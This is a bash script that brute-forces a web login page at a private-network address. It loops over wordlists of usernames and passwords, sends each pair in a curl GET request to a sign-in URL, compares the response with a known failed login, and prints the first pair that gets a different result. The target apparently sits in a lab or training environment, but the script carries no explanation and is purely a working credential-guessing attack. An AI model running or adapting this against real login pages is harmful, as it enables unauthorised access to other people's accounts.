#!/bin/bash

curl -s 'http://192.168.1.22/index.php?page=signin&username=test&password=test&Login=Login' > wrongLogin.txt
while read user
do
    while read pwd
    do
        curl -s "http://192.168.1.22/index.php?page=signin&username=$user&password=$pwd&Login=Login" > testLogin.txt
        diff --brief <(sort wrongLogin.txt) <(sort testLogin.txt) >/dev/null
        comp_value=$?
        echo "test: $user / $pwd"
        if [ $comp_value -eq 1 ]
        then
            echo "username: $user, password: $pwd"
            rm testLogin.txt
            break
        fi
        rm testLogin.txt
    done < "password.txt"
done < "username.txt"